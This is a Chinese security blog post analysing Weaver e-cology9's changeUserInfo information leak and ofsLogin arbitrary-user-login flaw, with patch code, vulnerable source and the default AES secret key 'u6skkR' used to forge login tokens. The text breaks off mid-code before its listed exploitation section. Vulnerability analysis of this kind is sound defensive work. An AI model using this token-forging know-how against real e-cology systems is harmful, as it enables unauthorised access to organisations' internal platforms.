<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>泛微e-cology9 changeUserInfo信息泄漏及ofsLogin任意用户登录漏洞分析 | _0xf4n9x_'s Blog</title><meta name="author" content="_0xf4n9x_"><meta name="copyright" content="_0xf4n9x_"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="0x00 漏洞简介 0x01 影响范围 e-cology9本身版本 补丁版本   0x02 漏洞分析 补丁包分析 任意用户登录分析 信息泄漏分析   0x03 漏洞利用 0x04 修复建议  0x00 漏洞简介泛微协同管理应用平台(e-cology)是一套兼具企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理、数据中心功能的企业大型协同">
<meta property="og:type" content="article">
<meta property="og:title" content="泛微e-cology9 changeUserInfo信息泄漏及ofsLogin任意用户登录漏洞分析">
<meta property="og:url" content="https://0xf4n9x.github.io/weaver-ecology9-changeuserinfo-ofslogin.html">
<meta property="og:site_name" content="_0xf4n9x_&#39;s Blog">
<meta property="og:description" content="0x00 漏洞简介 0x01 影响范围 e-cology9本身版本 补丁版本   0x02 漏洞分析 补丁包分析 任意用户登录分析 信息泄漏分析   0x03 漏洞利用 0x04 修复建议  0x00 漏洞简介泛微协同管理应用平台(e-cology)是一套兼具企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理、数据中心功能的企业大型协同">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://0xf4n9x.github.io/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151811489.png">
<meta property="article:published_time" content="2023-05-18T01:18:34.000Z">
<meta property="article:modified_time" content="2023-05-20T09:56:38.000Z">
<meta property="article:author" content="_0xf4n9x_">
<meta property="article:tag" content="java">
<meta property="article:tag" content="sqli">
<meta property="article:tag" content="ecology">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://0xf4n9x.github.io/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151811489.png"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://0xf4n9x.github.io/weaver-ecology9-changeuserinfo-ofslogin.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-YRH7DCY1TL"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-YRH7DCY1TL');
</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;3f9a5286f0c84213b902626e6f7a5081&quot;}"></script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: false,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '泛微e-cology9 changeUserInfo信息泄漏及ofsLogin任意用户登录漏洞分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-05-20 17:56:38'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="_0xf4n9x_'s Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151811489.png')"><nav id="nav"><span id="blog-info"><a href="/" title="_0xf4n9x_'s Blog"><span class="site-name">_0xf4n9x_'s Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">泛微e-cology9 changeUserInfo信息泄漏及ofsLogin任意用户登录漏洞分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-05-18T01:18:34.000Z" title="Created 2023-05-18 09:18:34">2023-05-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-05-20T09:56:38.000Z" title="Updated 2023-05-20 17:56:38">2023-05-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">4.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>21min</span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/weaver-ecology9-changeuserinfo-ofslogin.html#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
<li><a href="#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">0x00 漏洞简介</a></li>
<li><a href="#0x01-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4">0x01 影响范围</a><ul>
<li><a href="#e-cology9%E6%9C%AC%E8%BA%AB%E7%89%88%E6%9C%AC">e-cology9本身版本</a></li>
<li><a href="#%E8%A1%A5%E4%B8%81%E7%89%88%E6%9C%AC">补丁版本</a></li>
</ul>
</li>
<li><a href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">0x02 漏洞分析</a><ul>
<li><a href="#%E8%A1%A5%E4%B8%81%E5%8C%85%E5%88%86%E6%9E%90">补丁包分析</a></li>
<li><a href="#%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90">任意用户登录分析</a></li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%86%E6%9E%90">信息泄漏分析</a></li>
</ul>
</li>
<li><a href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x03 漏洞利用</a></li>
<li><a href="#0x04-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">0x04 修复建议</a></li>
</ul>
<h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>泛微协同管理应用平台(e-cology)是一套兼具企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理、数据中心功能的企业大型协同管理平台，并可形成一系列的通用解决方案和行业解决方案。</p>
<p>2023年05月15日，泛微官方发布10.57.2版本安全补丁。其中修复了两个漏洞，分别是信息泄漏和任意用户登录漏洞，两个漏洞可以被攻击者组合起来利用，从而能够使攻击者进入到系统后台。</p>
<h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><h3 id="e-cology9本身版本"><a href="#e-cology9本身版本" class="headerlink" title="e-cology9本身版本"></a>e-cology9本身版本</h3><p>在测试的几个版本中，如下几个版本是不存在<code>ofsLogin.jsp</code>文件的。</p>
<ul>
<li>9.00.1807.03</li>
<li>9.00.2008.17</li>
<li>9.00.2102.07</li>
<li>9.00.2110.01</li>
</ul>
<p>在如下版本中是存在<code>ofsLogin.jsp</code>文件的。</p>
<ul>
<li>9.00.2206.02</li>
</ul>
<p>那么可以简单判断，在<code>9.00.2110.01</code>以及之前的版本是不受该漏洞的影响的，在<code>9.00.2206.02</code><strong>以及之后的版本</strong>可能会受到该漏洞的影响，而在这两个版本之间的版本，由于没有源码，是否受影响就不得而知了。</p>
<h3 id="补丁版本"><a href="#补丁版本" class="headerlink" title="补丁版本"></a>补丁版本</h3><ul>
<li>&lt;10.57.2</li>
</ul>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="补丁包分析"><a href="#补丁包分析" class="headerlink" title="补丁包分析"></a>补丁包分析</h3><p>2023年04月18日，泛微首次发布v10.57版本补丁包，同年05月15日又发布v10.57.2版本补丁包，通过如下两条链接分别下载两个版本的补丁包。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.weaver.com.cn/cs/package/Ecology_security_20230418_v9.0_v10.57.zip?v=20230418</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.weaver.com.cn/cs/package/Ecology_security_20230515_v9.0_v10.57.2.zip?v=20230515</span><br></pre></td></tr></table></figure>

<p>由于泛微官方已经将本文两个漏洞的补丁文件覆盖到了v10.57版本补丁包中，所以现在下载到的v10.57版本补丁包其中也有了相关的漏洞补丁文件。拿现在构造好的链接下载得到的v10.57版本补丁包与v10.57.2版本补丁包相对比是对比不出什么差异的。</p>
<p>不过我在04月20日及时下载了v10.57版本的补丁包，所以拿其与现在的v10.57.2版本补丁包对比，是能够很迅速地发现新增的漏洞补丁文件。</p>
<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519162317147.png"></p>
<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519162750163.png"></p>
<p>如下是第一个漏洞补丁代码，暴露出的是<code>/mobile/plugin/1/ofsLogin.jsp</code>文件与<code>syscode</code>参数，并且还检查<code>transferE9</code>文件中<code>secretkey</code>的值是否等于<code>u6skkR</code>，如果是则提醒更改密钥，且产生漏洞利用安全警告。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (path.indexOf(<span class="string">&quot;/mobile/&quot;</span>) != -<span class="number">1</span> &amp;&amp; path.contains(<span class="string">&quot;/plugin/&quot;</span>) &amp;&amp; path.contains(<span class="string">&quot;/1/&quot;</span>) &amp;&amp; path.indexOf(<span class="string">&quot;ofslogin.jsp&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> sc.getUser(req);</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">returnInfoString</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">BaseBean</span> <span class="variable">baseBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BaseBean</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">isFix</span> <span class="operator">=</span> sc.getIntValue(baseBean.getPropValue(<span class="string">&quot;transferE9&quot;</span>, <span class="string">&quot;isFix&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (isFix == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">rnd</span> <span class="operator">=</span> baseBean.getPropValue(<span class="string">&quot;transferE9&quot;</span>, <span class="string">&quot;secretkey&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;u6skkR&quot;</span>.equalsIgnoreCase(rnd) || StringUtils.isBlank(rnd) || rnd.length() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        returnInfoString = <span class="string">&quot;认证密钥不安全，transferE9中更新密钥，请更改密钥，建议设置为：&quot;</span> + UUID.randomUUID().toString().substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), <span class="string">&quot;漏洞利用&quot;</span>);</span><br><span class="line">        sc.writeLog(<span class="string">&quot;&gt;&gt;&gt;&gt;Xss(Validate failed[access reject]) validateClass=weaver.security.rules.SecurityRuleOfcLogin  path=&quot;</span> + req.getRequestURI() + <span class="string">&quot; msg:&quot;</span> + returnInfoString + <span class="string">&quot; security validate failed! pushKey is null!  user:&quot;</span> + (user != <span class="literal">null</span> ? user.getLastname() : <span class="literal">null</span>) + <span class="string">&quot;  source ip:&quot;</span> + ThreadVarManager.getIp());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">syscode</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;syscode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;im&quot;</span>.equalsIgnoreCase(syscode)) &#123;</span><br><span class="line">        returnInfoString = <span class="string">&quot;syscode参数异常，syscode=&quot;</span> + syscode;</span><br><span class="line">        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), <span class="string">&quot;漏洞利用&quot;</span>);</span><br><span class="line">        sc.writeLog(<span class="string">&quot;&gt;&gt;&gt;&gt;Xss(Validate failed[access reject]) validateClass=weaver.security.rules.SecurityRuleOfcLogin  path=&quot;</span> + req.getRequestURI() + <span class="string">&quot; msg:&quot;</span> + returnInfoString + <span class="string">&quot; security validate failed! pushKey is null!  user:&quot;</span> + (user != <span class="literal">null</span> ? user.getLastname() : <span class="literal">null</span>) + <span class="string">&quot;  source ip:&quot;</span> + ThreadVarManager.getIp());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二个漏洞的补丁代码如下，指明<code>/mobile/plugin/changeUserInfo.jsp</code>文件与当<code>type</code>参数值等于<code>&quot;getLoginid&quot;</code>时的情况。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (path.contains(<span class="string">&quot;/mobile/&quot;</span>) &amp;&amp; path.contains(<span class="string">&quot;/plugin/&quot;</span>) &amp;&amp; path.contains(<span class="string">&quot;/changeuserinfo.jsp&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;E9&quot;</span>.equals(sc.getEcVersion())) &#123;</span><br><span class="line">        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), <span class="string">&quot;漏洞利用&quot;</span>);</span><br><span class="line">        sc.writeLog(<span class="string">&quot;&gt;&gt;&gt;&gt;Xss(Validate failed[acess reject]) validateClass=weaver.security.rules.SecurityRuelForMobileChangeInfo  path=&quot;</span> + req.getRequestURL() + <span class="string">&quot;  security validate failed! user: &quot;</span> + (user != <span class="literal">null</span> ? user.getLastname() : <span class="string">&quot;&quot;</span>) + <span class="string">&quot; source ip:&quot;</span> + ThreadVarManager.getIp());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;getLoginid&quot;</span>.equals(type)) &#123;</span><br><span class="line">        sc.putToTmpForbiddenIpMap(ThreadVarManager.getIp(), req.getRequestURI(), <span class="string">&quot;漏洞利用&quot;</span>);</span><br><span class="line">        sc.writeLog(<span class="string">&quot;&gt;&gt;&gt;&gt;Xss(Validate failed[acess reject]) validateClass=weaver.security.rules.SecurityRuelForMobileChangeInfo  path=&quot;</span> + req.getRequestURL() + <span class="string">&quot; type=&quot;</span> + type + <span class="string">&quot; security validate failed! user: &quot;</span> + (user != <span class="literal">null</span> ? user.getLastname() : <span class="string">&quot;&quot;</span>) + <span class="string">&quot; source ip:&quot;</span> + ThreadVarManager.getIp());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么，接下来对如上两个文件做进一步分析。</p>
<h3 id="任意用户登录分析"><a href="#任意用户登录分析" class="headerlink" title="任意用户登录分析"></a>任意用户登录分析</h3><p>首先先进入<code>mobile/plugin/1/ofsLogin.jsp</code>文件，如下图所示。</p>
<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519164856242.png"></p>
<p>最开头根据<code>syscode</code>、<code>receiver</code>、<code>timestamp</code>、<code>loginTokenFromThird</code>、<code>gopage</code>参数接收相应的参数值，然后对<code>loginTokenFromThird</code>参数值进行判断是否等于<code>loginTokenFromThird2</code>的值，如果不等于则会登录失败跳转至<code>/login/Login.jsp</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">toURL</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger();</span><br><span class="line"><span class="type">String</span> <span class="variable">syscode</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;syscode&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">receiver</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;receiver&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">timestamp</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;timestamp&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">loginTokenFromThird</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;loginTokenFromThird&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">gopage</span> <span class="operator">=</span> URLDecoder.decode(request.getParameter(<span class="string">&quot;gopage&quot;</span>),<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">loginTokenFromThird2</span> <span class="operator">=</span>  AESCoder.encrypt(receiver+timestamp, syscode+Prop.getPropValue(<span class="string">&quot;transferE9&quot;</span>,<span class="string">&quot;secretkey&quot;</span>));</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;=======================登陆认证开始=================================&quot;</span>);</span><br><span class="line">log.info(<span class="string">&quot;syscode：&quot;</span>+syscode);</span><br><span class="line">log.info(<span class="string">&quot;receiver：&quot;</span>+receiver);</span><br><span class="line">log.info(<span class="string">&quot;timestamp：&quot;</span>+timestamp);</span><br><span class="line">log.info(<span class="string">&quot;loginTokenFromThird ：&quot;</span>+loginTokenFromThird);</span><br><span class="line">log.info(<span class="string">&quot;gopage：&quot;</span>+gopage);</span><br><span class="line">log.info(<span class="string">&quot;loginTokenFromThird2：&quot;</span>+loginTokenFromThird2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!loginTokenFromThird.equalsIgnoreCase(loginTokenFromThird2))&#123;</span><br><span class="line">    log.info(<span class="string">&quot;登陆失败！&quot;</span>);</span><br><span class="line">        <span class="comment">//response.sendRedirect(&quot;/login/Login.jsp&quot;);</span></span><br><span class="line">    toURL = <span class="string">&quot;/login/Login.jsp&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看看<code>Prop.getPropValue(&quot;transferE9&quot;,&quot;secretkey&quot;)</code>是干嘛的，相关代码如下，其实就是获取<code>prop/transferE9.properties</code>文件中<code>secretkey</code>的值，是<code>u6skkR</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Properties <span class="title function_">loadTemplateProp</span><span class="params">(String var0)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(PROP_ROOT + var0 + <span class="string">&quot;.properties&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!var8.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">var3</span> <span class="operator">=</span> var8.lastModified();</span><br><span class="line">            <span class="type">Long</span> <span class="variable">var5</span> <span class="operator">=</span> (Long)htmlfileTime.get(var0);</span><br><span class="line">            <span class="keyword">if</span> (var5 == <span class="literal">null</span> || var5 != var3) &#123;</span><br><span class="line">                var1 = <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">                <span class="type">BufferedInputStream</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(var8));</span><br><span class="line">                var1.load(var6);</span><br><span class="line">                var6.close();</span><br><span class="line">                htmlfileHash.put(var0, var1);</span><br><span class="line">                htmlfileTime.put(var0, <span class="keyword">new</span> <span class="title class_">Long</span>(var3));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (Properties)htmlfileHash.get(var0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        <span class="type">LogMan</span> <span class="variable">var2</span> <span class="operator">=</span> LogMan.getInstance();</span><br><span class="line">        var2.writeLog(<span class="string">&quot;Prop.class&quot;</span>, var7);</span><br><span class="line">        var2.writeLog(<span class="string">&quot;root path is : &quot;</span> + PROP_ROOT);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 